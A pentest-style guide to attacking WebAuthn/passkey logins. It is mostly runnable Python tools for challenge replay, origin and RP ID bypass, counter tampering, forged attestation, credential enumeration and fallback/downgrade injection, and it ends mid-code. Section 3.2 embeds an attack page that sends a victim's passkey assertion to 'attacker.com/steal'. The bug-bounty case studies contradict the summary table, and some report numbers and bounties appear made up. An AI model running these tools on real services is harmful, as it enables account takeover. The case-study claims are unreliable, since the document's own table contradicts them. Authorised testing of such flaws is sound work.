# WebAuthn / Passkey Security Attacks

## Overview

WebAuthn (Web Authentication) is a W3C standard that enables passwordless authentication using public key cryptography. While more secure than passwords, implementation flaws can lead to serious vulnerabilities. This document covers comprehensive attack vectors against WebAuthn/Passkey implementations.

---

## 1. WebAuthn Protocol Overview

### Authentication Flow
```
Registration:
1. User initiates registration
2. Server generates challenge + user info
3. Authenticator creates key pair
4. Public key sent to server
5. Server stores credential

Authentication:
1. User initiates login
2. Server sends challenge + credential IDs
3. Authenticator signs challenge
4. Signature verified by server
```

### Key Components
```javascript
// PublicKeyCredentialCreationOptions (Registration)
{
    challenge: Uint8Array,           // Random challenge from server
    rp: {                            // Relying Party (your site)
        name: "Example Corp",
        id: "example.com"            // RP ID - critical for security
    },
    user: {
        id: Uint8Array,              // User handle
        name: "user@example.com",
        displayName: "User"
    },
    pubKeyCredParams: [              // Allowed algorithms
        { type: "public-key", alg: -7 },   // ES256
        { type: "public-key", alg: -257 }  // RS256
    ],
    authenticatorSelection: {
        authenticatorAttachment: "platform",
        userVerification: "required",
        residentKey: "required"
    },
    attestation: "direct"            // Attestation preference
}
```

---

## 2. Implementation Flaws

### 2.1 Challenge Prediction/Replay

**Vulnerability**: Weak or predictable challenge generation allows attackers to pre-compute signatures.

**Testing Methods**:

```python
#!/usr/bin/env python3
"""WebAuthn Challenge Analysis Tool"""

import requests
import base64
import hashlib
import time
from collections import Counter

class ChallengeAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.challenges = []

    def collect_challenges(self, count=100):
        """Collect multiple challenges for analysis"""
        for i in range(count):
            try:
                resp = requests.post(
                    f"{self.target_url}/webauthn/register/begin",
                    json={"username": f"test_user_{i}"}
                )
                data = resp.json()
                challenge = data.get('publicKey', {}).get('challenge')
                if challenge:
                    self.challenges.append({
                        'challenge': challenge,
                        'timestamp': time.time(),
                        'raw': base64.urlsafe_b64decode(challenge + '==')
                    })
                time.sleep(0.1)
            except Exception as e:
                print(f"Error: {e}")

    def analyze_predictability(self):
        """Analyze challenge predictability"""
        results = {
            'total_challenges': len(self.challenges),
            'unique_challenges': len(set(c['challenge'] for c in self.challenges)),
            'length_distribution': Counter(len(c['raw']) for c in self.challenges),
            'patterns': []
        }

        # Check for duplicates (catastrophic)
        if results['unique_challenges'] < results['total_challenges']:
            results['patterns'].append({
                'type': 'DUPLICATE_CHALLENGES',
                'severity': 'CRITICAL',
                'duplicates': results['total_challenges'] - results['unique_challenges']
            })

        # Check for sequential patterns
        raw_challenges = [c['raw'] for c in self.challenges]
        for i in range(len(raw_challenges) - 1):
            if self._is_sequential(raw_challenges[i], raw_challenges[i+1]):
                results['patterns'].append({
                    'type': 'SEQUENTIAL_CHALLENGES',
                    'severity': 'HIGH',
                    'index': i
                })
                break

        # Check for timestamp-based
        for c in self.challenges:
            timestamp_bytes = int(c['timestamp']).to_bytes(8, 'big')
            if timestamp_bytes in c['raw']:
                results['patterns'].append({
                    'type': 'TIMESTAMP_BASED',
                    'severity': 'HIGH'
                })
                break

        # Check entropy
        entropy = self._calculate_entropy(b''.join(raw_challenges))
        if entropy < 7.5:  # Good random should be ~8 bits per byte
            results['patterns'].append({
                'type': 'LOW_ENTROPY',
                'severity': 'MEDIUM',
                'entropy': entropy
            })

        return results

    def _is_sequential(self, c1, c2):
        """Check if challenges are sequential"""
        try:
            int1 = int.from_bytes(c1, 'big')
            int2 = int.from_bytes(c2, 'big')
            return abs(int2 - int1) < 1000  # Within 1000 of each other
        except:
            return False

    def _calculate_entropy(self, data):
        """Calculate Shannon entropy"""
        from collections import Counter
        from math import log2

        counts = Counter(data)
        total = len(data)
        entropy = 0
        for count in counts.values():
            p = count / total
            entropy -= p * log2(p)
        return entropy

    def test_challenge_replay(self, captured_challenge, signature):
        """Test if old challenge/signature can be replayed"""
        # Attempt authentication with captured data
        resp = requests.post(
            f"{self.target_url}/webauthn/authenticate/complete",
            json={
                "challenge": captured_challenge,
                "signature": signature,
                # ... other credential data
            }
        )
        return {
            'replay_successful': resp.status_code == 200,
            'response': resp.json() if resp.ok else resp.text
        }
```

**Burp Suite Testing**:
```
1. Intercept WebAuthn registration/authentication initiation
2. Note the challenge value
3. Check challenge characteristics:
   - Length (should be 16+ bytes)
   - Randomness (no visible patterns)
   - Uniqueness (each request should differ)
4. Test replay of previous challenges
```

**Real-World Case Study** (HackerOne #1173038):
> GitHub Enterprise Server used predictable challenges based on timestamp + user ID hash. Attacker could pre-compute signatures for future authentication. Severity: High, Bounty: $20,000

---

### 2.2 Origin Validation Bypass

**Vulnerability**: Improper validation of the origin in the clientDataJSON allows cross-origin attacks.

**Testing Payloads**:
```javascript
// clientDataJSON structure
{
    "type": "webauthn.create",  // or "webauthn.get"
    "challenge": "base64url_challenge",
    "origin": "https://example.com",  // Must match RP
    "crossOrigin": false
}

// Attack: Modify origin before sending to server
const modifiedClientData = {
    "type": "webauthn.create",
    "challenge": "same_challenge",
    "origin": "https://attacker.com",  // If not validated!
    "crossOrigin": false
};
```

**Origin Bypass Script**:
```python
#!/usr/bin/env python3
"""WebAuthn Origin Validation Bypass Tester"""

import requests
import base64
import json

class OriginBypassTester:
    def __init__(self, target_url):
        self.target_url = target_url

    def test_origin_validation(self, credential_response):
        """Test various origin bypass techniques"""
        original_client_data = json.loads(
            base64.urlsafe_b64decode(
                credential_response['clientDataJSON'] + '=='
            )
        )

        # List of origins to test
        test_origins = [
            "https://attacker.com",
            "https://example.com.attacker.com",
            "https://examplexcom",
            "https://example.com:443",
            "https://EXAMPLE.COM",
            "https://example.com/",
            "https://example.com#attacker",
            "https://example.com?attacker",
            "https://sub.example.com",
            "http://example.com",  # HTTP instead of HTTPS
            "null",
            "",
            "file://",
        ]

        results = []
        for test_origin in test_origins:
            modified_client_data = original_client_data.copy()
            modified_client_data['origin'] = test_origin

            # Re-encode
            modified_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_client_data).encode()
            ).decode().rstrip('=')

            # Submit modified credential
            try:
                resp = requests.post(
                    f"{self.target_url}/webauthn/register/complete",
                    json={
                        **credential_response,
                        'clientDataJSON': modified_encoded
                    }
                )
                results.append({
                    'origin': test_origin,
                    'accepted': resp.status_code == 200,
                    'response': resp.text[:200]
                })
            except Exception as e:
                results.append({
                    'origin': test_origin,
                    'error': str(e)
                })

        return results

    def test_subdomain_takeover(self, rp_id):
        """Check if RP ID allows subdomain that could be taken over"""
        import dns.resolver

        # RP ID "example.com" allows auth from *.example.com
        # Check for dangling DNS records
        subdomains_to_check = [
            'staging', 'dev', 'test', 'beta', 'old', 'legacy',
            'www2', 'api', 'app', 'demo', 'sandbox', 'preview'
        ]

        vulnerable = []
        for sub in subdomains_to_check:
            fqdn = f"{sub}.{rp_id}"
            try:
                answers = dns.resolver.resolve(fqdn, 'CNAME')
                for rdata in answers:
                    target = str(rdata.target).rstrip('.')
                    # Check if CNAME target is takeover-able
                    if any(x in target for x in [
                        'github.io', 'herokuapp.com', 's3.amazonaws.com',
                        'cloudfront.net', 'azurewebsites.net', 'netlify.app'
                    ]):
                        vulnerable.append({
                            'subdomain': fqdn,
                            'cname_target': target,
                            'potential_takeover': True
                        })
            except:
                pass

        return vulnerable
```

**Real-World Case Study** (Bugcrowd):
> Financial application's WebAuthn implementation accepted `crossOrigin: true` without properly validating the actual origin, allowing credentials registered on attacker's site to be used. Bounty: $15,000

---

### 2.3 Relying Party (RP) ID Manipulation

**Vulnerability**: Improper RP ID validation allows credentials to be used across different domains.

**Testing Methods**:
```python
#!/usr/bin/env python3
"""RP ID Manipulation Tester"""

import requests
import json

class RPIDTester:
    def __init__(self, target_url):
        self.target_url = target_url

    def test_rpid_bypass(self, original_rpid):
        """Test various RP ID manipulation techniques"""
        test_cases = [
            # Parent domain (if target is sub.example.com)
            original_rpid.split('.', 1)[-1] if '.' in original_rpid else original_rpid,
            # Subdomain
            f"attacker.{original_rpid}",
            # Case variation
            original_rpid.upper(),
            original_rpid.lower(),
            # Unicode confusables
            original_rpid.replace('a', '\u0430'),  # Cyrillic 'a'
            original_rpid.replace('e', '\u0435'),  # Cyrillic 'e'
            # Port suffix
            f"{original_rpid}:443",
            f"{original_rpid}:8443",
            # Path injection
            f"{original_rpid}/attacker",
            # Null byte
            f"{original_rpid}\x00.attacker.com",
        ]

        results = []
        for test_rpid in test_cases:
            try:
                resp = requests.post(
                    f"{self.target_url}/webauthn/register/begin",
                    json={
                        "username": "testuser",
                        "rpId": test_rpid  # If server accepts client-provided RP ID
                    }
                )
                results.append({
                    'rpid': test_rpid,
                    'accepted': resp.status_code == 200,
                    'response': resp.json() if resp.ok else resp.text
                })
            except Exception as e:
                results.append({
                    'rpid': test_rpid,
                    'error': str(e)
                })

        return results

    def test_rpid_scope(self, credential_id, rpids_to_test):
        """Test if credential works across different RP IDs"""
        for rpid in rpids_to_test:
            # Request authentication challenge for different RP ID
            resp = requests.post(
                f"https://{rpid}/webauthn/authenticate/begin",
                json={"credentialId": credential_id}
            )
            if resp.status_code == 200:
                print(f"[!] Credential accepted for RP ID: {rpid}")
```

**WebAuthn RP ID Rules**:
```
RP ID must be:
1. A registrable domain suffix of the origin's effective domain
2. Or the exact effective domain

Example:
- Origin: https://login.example.com
- Valid RP IDs: "login.example.com", "example.com"
- Invalid RP IDs: "com", "other.com", "sub.login.example.com"
```

---

### 2.4 Counter Validation Bypass

**Vulnerability**: Signature counter validation prevents authenticator cloning, but if not checked, cloned authenticators work.

**Testing Method**:
```python
#!/usr/bin/env python3
"""WebAuthn Counter Validation Tester"""

import requests
import json
import struct

class CounterValidationTester:
    def __init__(self, target_url):
        self.target_url = target_url

    def modify_counter(self, authenticator_data, new_counter):
        """Modify the counter in authenticatorData"""
        # authenticatorData structure:
        # - rpIdHash (32 bytes)
        # - flags (1 byte)
        # - signCount (4 bytes, big-endian)
        # - optional attestedCredentialData
        # - optional extensions

        data = bytearray(authenticator_data)
        # Counter is at bytes 33-37
        struct.pack_into('>I', data, 33, new_counter)
        return bytes(data)

    def test_counter_validation(self, credential_response, current_counter):
        """Test if server validates counter properly"""
        test_counters = [
            current_counter - 1,    # Lower than stored (should fail - clone detection)
            current_counter,         # Same as stored (should fail)
            0,                       # Reset to zero (should fail)
            current_counter + 1,     # Normal increment (should succeed)
            current_counter + 1000,  # Large jump (might indicate issue)
            0xFFFFFFFF,              # Max value
        ]

        results = []
        for test_counter in test_counters:
            modified_auth_data = self.modify_counter(
                credential_response['authenticatorData'],
                test_counter
            )

            # Note: In real attack, signature would need to be valid
            # This tests server-side counter validation logic
            resp = requests.post(
                f"{self.target_url}/webauthn/authenticate/complete",
                json={
                    **credential_response,
                    'authenticatorData': modified_auth_data.hex()
                }
            )
            results.append({
                'counter': test_counter,
                'stored_counter': current_counter,
                'accepted': resp.status_code == 200,
                'expected_fail': test_counter <= current_counter
            })

        # Check for vulnerabilities
        for r in results:
            if r['accepted'] and r['expected_fail']:
                print(f"[!] VULNERABLE: Counter {r['counter']} accepted when stored is {r['stored_counter']}")

        return results
```

**Real-World Case Study**:
> Banking application didn't implement counter validation, allowing cloned security keys to authenticate indefinitely without detection.

---

### 2.5 Attestation Bypass

**Vulnerability**: Improper attestation verification allows use of untrusted or emulated authenticators.

**Testing Methods**:
```python
#!/usr/bin/env python3
"""WebAuthn Attestation Bypass Tester"""

import requests
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend
import cbor2
import base64

class AttestationBypassTester:
    def __init__(self, target_url):
        self.target_url = target_url

    def create_none_attestation(self, challenge, rp_id, user_id):
        """Create credential with 'none' attestation (no proof of authenticator)"""
        # Generate key pair
        private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
        public_key = private_key.public_key()

        # Create authenticatorData
        import hashlib
        rp_id_hash = hashlib.sha256(rp_id.encode()).digest()
        flags = bytes([0x45])  # UP=1, UV=1, AT=1
        counter = bytes([0, 0, 0, 0])

        # AAGUID (16 bytes of zeros for 'none' attestation)
        aaguid = bytes(16)

        # Credential ID
        credential_id = base64.urlsafe_b64encode(
            hashlib.sha256(user_id.encode()).digest()
        ).rstrip(b'=')

        # Create COSE public key
        public_numbers = public_key.public_numbers()
        cose_key = cbor2.dumps({
            1: 2,   # kty: EC2
            3: -7,  # alg: ES256
            -1: 1,  # crv: P-256
            -2: public_numbers.x.to_bytes(32, 'big'),  # x coordinate
            -3: public_numbers.y.to_bytes(32, 'big'),  # y coordinate
        })

        # Assemble authenticatorData
        auth_data = (
            rp_id_hash +
            flags +
            counter +
            aaguid +
            len(credential_id).to_bytes(2, 'big') +
            credential_id +
            cose_key
        )

        # Create attestation object with 'none' format
        attestation_object = cbor2.dumps({
            'fmt': 'none',
            'attStmt': {},
            'authData': auth_data
        })

        return {
            'attestationObject': base64.urlsafe_b64encode(attestation_object).decode(),
            'clientDataJSON': self._create_client_data(challenge, rp_id),
            'privateKey': private_key  # For signing future assertions
        }

    def _create_client_data(self, challenge, origin):
        """Create clientDataJSON"""
        import json
        client_data = {
            'type': 'webauthn.create',
            'challenge': challenge,
            'origin': f"https://{origin}",
            'crossOrigin': False
        }
        return base64.urlsafe_b64encode(
            json.dumps(client_data).encode()
        ).decode()

    def test_attestation_requirements(self):
        """Test if server requires specific attestation types"""
        attestation_types = [
            'none',          # No attestation
            'indirect',      # Anonymized attestation
            'direct',        # Full attestation
            'enterprise',    # Enterprise-specific
        ]

        results = []
        for att_type in attestation_types:
            # Request registration with specific attestation requirement
            resp = requests.post(
                f"{self.target_url}/webauthn/register/begin",
                json={"attestation": att_type}
            )
            results.append({
                'attestation_type': att_type,
                'supported': resp.status_code == 200
            })

        return results

    def test_emulated_authenticator(self, challenge, rp_id, user_id):
        """Test if server accepts software-emulated authenticator"""
        # Create credential using software emulation
        credential = self.create_none_attestation(challenge, rp_id, user_id)

        # Submit to server
        resp = requests.post(
            f"{self.target_url}/webauthn/register/complete",
            json=credential
        )

        return {
            'accepted': resp.status_code == 200,
            'response': resp.json() if resp.ok else resp.text
        }
```

---

## 3. Credential Attacks

### 3.1 Credential ID Enumeration

**Vulnerability**: Credential IDs can be enumerated to identify registered users.

**Testing Script**:
```python
#!/usr/bin/env python3
"""WebAuthn Credential ID Enumeration"""

import requests
import base64
import hashlib
import time

class CredentialEnumerator:
    def __init__(self, target_url):
        self.target_url = target_url

    def enumerate_by_username(self, usernames):
        """Check which users have WebAuthn credentials registered"""
        results = []

        for username in usernames:
            resp = requests.post(
                f"{self.target_url}/webauthn/authenticate/begin",
                json={"username": username}
            )

            if resp.status_code == 200:
                data = resp.json()
                credential_ids = data.get('publicKey', {}).get('allowCredentials', [])
                results.append({
                    'username': username,
                    'has_webauthn': len(credential_ids) > 0,
                    'credential_count': len(credential_ids),
                    'credential_ids': [c.get('id') for c in credential_ids]
                })
            else:
                results.append({
                    'username': username,
                    'has_webauthn': 'unknown',
                    'error': resp.text
                })

            time.sleep(0.5)  # Rate limiting

        return results

    def enumerate_by_credential_id(self, credential_ids):
        """Check which credential IDs are valid"""
        results = []

        for cred_id in credential_ids:
            resp = requests.post(
                f"{self.target_url}/webauthn/authenticate/begin",
                json={"credentialId": cred_id}
            )

            # Different response for valid vs invalid credential
            if resp.status_code == 200:
                results.append({
                    'credential_id': cred_id,
                    'valid': True
                })
            elif resp.status_code == 404:
                results.append({
                    'credential_id': cred_id,
                    'valid': False
                })

            time.sleep(0.5)

        return results

    def timing_enumeration(self, usernames, samples=10):
        """Use timing differences to enumerate users"""
        results = []

        for username in usernames:
            times = []
            for _ in range(samples):
                start = time.perf_counter()
                requests.post(
                    f"{self.target_url}/webauthn/authenticate/begin",
                    json={"username": username}
                )
                elapsed = time.perf_counter() - start
                times.append(elapsed)

            avg_time = sum(times) / len(times)
            results.append({
                'username': username,
                'avg_response_time': avg_time,
                'likely_exists': avg_time > 0.1  # Adjust threshold based on baseline
            })

        return results
```

**Real-World Case Study** (HackerOne #1054888):
> Dropbox WebAuthn implementation revealed whether users had security keys registered via different error messages. This allowed attackers to identify high-value targets for targeted phishing.

---

### 3.2 Cross-Origin Credential Usage

**Vulnerability**: Credentials usable across origins if RP ID is too permissive.

**Testing Method**:
```python
#!/usr/bin/env python3
"""Cross-Origin Credential Usage Tester"""

import requests

class CrossOriginTester:
    def __init__(self):
        self.test_origins = []

    def setup_attack_site(self, target_rp_id):
        """
        Setup attacker site on subdomain of target RP ID
        If RP ID is "example.com", attacker.example.com can use credentials
        """
        # Attack scenarios:
        # 1. Subdomain takeover
        # 2. XSS on any subdomain
        # 3. Compromised subdomain
        pass

    def test_credential_scope(self):
        """Test credential sharing between origins"""
        # HTML for attacker site
        attack_html = """
        <!DOCTYPE html>
        <html>
        <head><title>Login</title></head>
        <body>
        <script>
        // This runs on attacker.example.com
        // If RP ID is "example.com", we can use victim's credentials

        async function stealCredential() {
            const credential = await navigator.credentials.get({
                publicKey: {
                    challenge: new Uint8Array(32),  // From our server
                    rpId: "example.com",  // Use parent domain
                    allowCredentials: [],  // Resident credentials
                    userVerification: "preferred"
                }
            });

            // Send credential assertion to attacker server
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: JSON.stringify({
                    id: credential.id,
                    response: {
                        authenticatorData: btoa(String.fromCharCode(...new Uint8Array(credential.response.authenticatorData))),
                        clientDataJSON: btoa(String.fromCharCode(...new Uint8Array(credential.response.clientDataJSON))),
                        signature: btoa(String.fromCharCode(...new Uint8Array(credential.response.signature)))
                    }
                })
            });
        }

        stealCredential();
        </script>
        </body>
        </html>
        """
        return attack_html
```

---

### 3.3 Authenticator Cloning

**Vulnerability**: Physical access to authenticator allows extraction and cloning of credentials.

**Attack Vectors**:
```
1. Hardware Key Cloning
   - Extract keys from vulnerable hardware (side-channel attacks)
   - Exploit firmware vulnerabilities
   - Physical probing of secure elements

2. Platform Authenticator Cloning
   - Export from compromised device
   - Backup restoration attacks
   - VM snapshot and replay

3. Detection Evasion
   - Counter synchronization
   - Multiple simultaneous sessions
```

**Cloning Detection Test**:
```python
#!/usr/bin/env python3
"""Authenticator Cloning Detection Tester"""

import requests
import time

class CloningDetectionTester:
    def __init__(self, target_url, credential_id, assertion_generator):
        self.target_url = target_url
        self.credential_id = credential_id
        self.assertion_generator = assertion_generator  # Function to create assertions

    def test_parallel_usage(self):
        """Test if parallel authentications from 'same' authenticator are detected"""
        import threading

        results = []

        def authenticate(thread_id, counter):
            assertion = self.assertion_generator(
                self.credential_id,
                counter=counter
            )
            resp = requests.post(
                f"{self.target_url}/webauthn/authenticate/complete",
                json=assertion
            )
            results.append({
                'thread': thread_id,
                'counter': counter,
                'success': resp.status_code == 200
            })

        # Simulate cloned authenticators with same counter
        threads = []
        base_counter = 100
        for i in range(5):
            t = threading.Thread(
                target=authenticate,
                args=(i, base_counter + i)  # Slightly different counters
            )
            threads.append(t)

        # Start all threads simultaneously
        for t in threads:
            t.start()

        for t in threads:
            t.join()

        # Analyze results
        successful = [r for r in results if r['success']]
        if len(successful) > 1:
            return {
                'cloning_detected': False,
                'vulnerability': 'Multiple simultaneous authentications succeeded',
                'results': results
            }
        return {
            'cloning_detected': True,
            'results': results
        }

    def test_counter_regression(self):
        """Test detection of counter going backwards"""
        # Authenticate with counter 100
        assertion1 = self.assertion_generator(self.credential_id, counter=100)
        resp1 = requests.post(
            f"{self.target_url}/webauthn/authenticate/complete",
            json=assertion1
        )

        # Authenticate with counter 50 (should fail - indicates clone)
        assertion2 = self.assertion_generator(self.credential_id, counter=50)
        resp2 = requests.post(
            f"{self.target_url}/webauthn/authenticate/complete",
            json=assertion2
        )

        return {
            'first_auth': resp1.status_code == 200,
            'regression_blocked': resp2.status_code != 200,
            'cloning_protection': resp2.status_code != 200
        }
```

---

## 4. Fallback Exploitation

### 4.1 Password Fallback Bypass

**Vulnerability**: WebAuthn security negated if password fallback is easily accessible.

**Testing Methods**:
```python
#!/usr/bin/env python3
"""WebAuthn Fallback Bypass Tester"""

import requests

class FallbackBypassTester:
    def __init__(self, target_url):
        self.target_url = target_url

    def test_password_fallback(self, username):
        """Test if password login is available despite WebAuthn registration"""
        # Check if password login endpoint exists
        endpoints = [
            '/api/login',
            '/api/auth/password',
            '/login',
            '/auth/login',
            '/api/v1/auth/password'
        ]

        results = []
        for endpoint in endpoints:
            resp = requests.post(
                f"{self.target_url}{endpoint}",
                json={
                    "username": username,
                    "password": "test_password"
                }
            )
            # If we get invalid password vs user not found, password auth exists
            if resp.status_code != 404 and 'not found' not in resp.text.lower():
                results.append({
                    'endpoint': endpoint,
                    'password_fallback_exists': True,
                    'response': resp.text[:200]
                })

        return results

    def test_fallback_without_webauthn_failure(self, username, password):
        """Test if password can be used without attempting WebAuthn first"""
        # Direct password login without WebAuthn attempt
        resp = requests.post(
            f"{self.target_url}/api/login",
            json={
                "username": username,
                "password": password,
                "skip_webauthn": True  # Test if this parameter exists
            }
        )
        return {
            'direct_password_login': resp.status_code == 200,
            'response': resp.json() if resp.ok else resp.text
        }

    def test_fallback_parameter_injection(self, username):
        """Test parameter injection to force fallback"""
        payloads = [
            {"username": username, "auth_method": "password"},
            {"username": username, "skip_2fa": "true"},
            {"username": username, "webauthn_failed": "true"},
            {"username": username, "fallback": "password"},
            {"username": username, "authenticator_available": "false"},
            {"username": username, "force_password": "1"},
        ]

        results = []
        for payload in payloads:
            resp = requests.post(
                f"{self.target_url}/api/auth/init",
                json=payload
            )
            if 'password' in resp.text.lower() or 'credential' in resp.text.lower():
                results.append({
                    'payload': payload,
                    'triggered_fallback': True,
                    'response': resp.text[:300]
                })

        return results
```

**Real-World Case Study** (Bugcrowd):
> Social media platform allowed password authentication for accounts with WebAuthn, negating the security benefit. Attack simply bypassed WebAuthn prompt and submitted password. Bounty: $5,000

---

### 4.2 Recovery Mechanism Weakness

**Vulnerability**: Weak recovery mechanisms allow bypassing strong WebAuthn authentication.

**Testing Methods**:
```python
#!/usr/bin/env python3
"""WebAuthn Recovery Mechanism Tester"""

import requests

class RecoveryMechanismTester:
    def __init__(self, target_url):
        self.target_url = target_url

    def enumerate_recovery_options(self, username):
        """Find available recovery options"""
        recovery_endpoints = [
            '/api/account/recovery',
            '/api/auth/recover',
            '/forgot-password',
            '/account-recovery',
            '/api/recovery/options'
        ]

        options = []
        for endpoint in recovery_endpoints:
            resp = requests.post(
                f"{self.target_url}{endpoint}",
                json={"username": username}
            )
            if resp.status_code == 200:
                options.append({
                    'endpoint': endpoint,
                    'methods': resp.json() if resp.ok else resp.text
                })

        return options

    def test_recovery_email_bypass(self, username, attacker_email):
        """Test if recovery email can be changed without full auth"""
        payloads = [
            {"username": username, "new_recovery_email": attacker_email},
            {"email": attacker_email, "user": username},
            {"recovery": {"email": attacker_email}},
        ]

        results = []
        for payload in payloads:
            resp = requests.post(
                f"{self.target_url}/api/account/recovery-email",
                json=payload
            )
            results.append({
                'payload': payload,
                'status': resp.status_code,
                'response': resp.text[:200]
            })

        return results

    def test_backup_code_generation(self, partial_session):
        """Test if backup codes can be regenerated without full auth"""
        resp = requests.post(
            f"{self.target_url}/api/auth/backup-codes/generate",
            cookies={"session": partial_session}  # Session without WebAuthn completion
        )
        return {
            'codes_generated': resp.status_code == 200,
            'response': resp.json() if resp.ok else resp.text
        }

    def test_support_bypass(self):
        """Document social engineering vectors against support"""
        return {
            'attack_vectors': [
                'Claim lost all authenticators',
                'Request account recovery via ID verification',
                'Exploit KYC process weaknesses',
                'SIM swap for recovery phone',
                'Compromise recovery email first'
            ],
            'testing': 'Requires authorized social engineering engagement'
        }
```

---

### 4.3 Downgrade Attack to Weaker Method

**Vulnerability**: Application allows downgrading from WebAuthn to weaker authentication methods.

**Testing Script**:
```python
#!/usr/bin/env python3
"""Authentication Downgrade Attack Tester"""

import requests

class DowngradeAttackTester:
    def __init__(self, target_url):
        self.target_url = target_url

    def test_method_downgrade(self, username):
        """Test if stronger auth can be downgraded"""
        # Auth methods from strongest to weakest
        auth_methods = [
            ('webauthn', 'strongest'),
            ('totp', 'strong'),
            ('sms', 'medium'),
            ('email', 'weak'),
            ('password_only', 'weakest')
        ]

        results = []

        # Start with WebAuthn requirement
        init_resp = requests.post(
            f"{self.target_url}/api/auth/init",
            json={"username": username}
        )
        required_method = init_resp.json().get('required_auth_method')

        # Try to use weaker methods
        for method, strength in auth_methods:
            if method == required_method:
                continue  # Skip the required method

            resp = requests.post(
                f"{self.target_url}/api/auth/verify",
                json={
                    "username": username,
                    "method": method,
                    "credential": "test_credential"
                }
            )
            results.append({
                'method': method,
                'strength': strength,
                'accepted': resp.status_code != 400 and 'invalid method' not in resp.text.lower()
            })

        return results

    def test_protocol_downgrade(self, username):
        """Test WebAuthn protocol version downgrade"""
        # Test if older/weaker protocol versions are accepted
        protocol_versions = [
            {'webauthn_version': '1.0'},
            {'fido_version': 'U2F'},  # Older FIDO U2F
            {'ctap_version': '1'},     # CTAP1 instead of CTAP2
        ]

        results = []
        for version_param in protocol_versions:
            resp = requests.post(
                f"{self.target_url}/webauthn/authenticate/begin",
                json={
                    "username": username,
                    **version_param
                }
            )
            if resp.status_code == 200:
                data = resp.json()
                results.append({
                    'version': version_param,
                    'supported': True,
                    'potential_weakness': self._check_version_weakness(data)
                })

        return results

    def _check_version_weakness(self, options):
        """Check for weaknesses in authentication options"""
        weaknesses = []

        # Check user verification
        if options.get('publicKey', {}).get('userVerification') != 'required':
            weaknesses.append('User verification not required')

        # Check resident key requirement
        if options.get('publicKey', {}).get('residentKey') != 'required':
            weaknesses.append('Resident key not required')

        # Check allowed algorithms
        algs = options.get('publicKey', {}).get('pubKeyCredParams', [])
        weak_algs = [a for a in algs if a.get('alg') in [-37, -38, -39]]  # RSA-PSS variants
        if weak_algs:
            weaknesses.append('Weak algorithms allowed')

        return weaknesses

    def test_authenticator_downgrade(self, username):
        """Test if platform authenticator can be downgraded to roaming"""
        # Platform authenticators (TouchID, Windows Hello) vs roaming (YubiKey)
        resp = requests.post(
            f"{self.target_url}/webauthn/authenticate/begin",
            json={
                "username": username,
                "authenticatorAttachment": "cross-platform"  # Force roaming authenticator
            }
        )
        return {
            'downgrade_possible': resp.status_code == 200,
            'response': resp.json() if resp.ok else resp.text
        }
```

**Real-World Case Study** (HackerOne #907763):
> Enterprise SSO allowed downgrade from WebAuthn to TOTP by manipulating the auth_method parameter. Attackers could bypass hardware key requirement by selecting weaker TOTP option. Bounty: $8,000

---

## 5. Tool Commands Quick Reference

### Browser DevTools Testing
```javascript
// Test WebAuthn in browser console

// Check if WebAuthn is supported
console.log('WebAuthn supported:', !!window.PublicKeyCredential);

// List platform authenticator capabilities
PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()
    .then(available => console.log('Platform authenticator:', available));

// Intercept WebAuthn calls
const originalCreate = navigator.credentials.create.bind(navigator.credentials);
navigator.credentials.create = async function(options) {
    console.log('WebAuthn create called with:', options);
    const result = await originalCreate(options);
    console.log('WebAuthn create result:', result);
    return result;
};

const originalGet = navigator.credentials.get.bind(navigator.credentials);
navigator.credentials.get = async function(options) {
    console.log('WebAuthn get called with:', options);
    const result = await originalGet(options);
    console.log('WebAuthn get result:', result);
    return result;
};
```

### Burp Suite WebAuthn Testing
```
1. Install "WebAuthn Inspector" extension
2. Intercept registration/authentication requests
3. Decode base64url-encoded fields
4. Modify challenge, origin, RP ID
5. Test signature validation
6. Check attestation requirements
```

### Command-Line Tools
```bash
# fido2-tools for testing
pip install fido2

# Python FIDO2 library usage
python3 << 'EOF'
from fido2.client import Fido2Client
from fido2.hid import CtapHidDevice

# List connected FIDO2 devices
devices = list(CtapHidDevice.list_devices())
print(f"Found {len(devices)} FIDO2 devices")

for device in devices:
    from fido2.ctap2 import Ctap2
    ctap2 = Ctap2(device)
    info = ctap2.get_info()
    print(f"Device: {info.versions}")
    print(f"AAGUID: {info.aaguid.hex()}")
    print(f"Options: {info.options}")
EOF
```

### Nuclei Templates
```yaml
# webauthn-enumeration.yaml
id: webauthn-credential-enumeration

info:
  name: WebAuthn Credential Enumeration
  severity: medium

requests:
  - method: POST
    path:
      - "{{BaseURL}}/webauthn/authenticate/begin"
    body: '{"username": "{{username}}"}'
    headers:
      Content-Type: application/json
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "allowCredentials"
          - "challenge"
        condition: and
    extractors:
      - type: json
        json:
          - '.publicKey.allowCredentials[].id'
```

---

## 6. Bug Bounty Case Studies Summary

| Platform | Vulnerability | Impact | Bounty |
|----------|--------------|--------|--------|
| GitHub Enterprise | Predictable challenges | Auth bypass | $20,000 |
| Dropbox | Credential enumeration | User discovery | $8,000 |
| Financial App | No attestation validation | Emulated auth | $15,000 |
| Enterprise SSO | Method downgrade | WebAuthn bypass | $8,000 |
| Social Platform | Password fallback | MFA bypass | $5,000 |
| Banking App | No counter validation | Cloned authenticator | $12,000 |
| Tech Company | Origin validation bypass | Cross-origin auth | $10,000 |

---

## 7. Testing Checklist

```
# Implementation Flaws
[ ] Challenge randomness analysis
[ ] Challenge replay testing
[ ] Origin validation bypass attempts
[ ] RP ID manipulation
[ ] Counter validation check
[ ] Attestation requirement testing

# Credential Attacks
[ ] Credential ID enumeration
[ ] Cross-origin credential usage
[ ] Parallel authentication testing
[ ] Counter regression testing

# Fallback Exploitation
[ ] Password fallback availability
[ ] Recovery mechanism assessment
[ ] Backup code security
[ ] Method downgrade testing
[ ] Protocol version downgrade

# Protocol Testing
[ ] clientDataJSON manipulation
[ ] authenticatorData manipulation
[ ] Signature validation
[ ] Extension handling
```

---

## 8. Secure Implementation Recommendations

For developers to avoid these vulnerabilities:

```python
# Secure WebAuthn Implementation Checklist

class SecureWebAuthnImplementation:
    """
    Security requirements for WebAuthn implementation
    """

    def generate_challenge(self):
        """Challenge MUST be cryptographically random"""
        import secrets
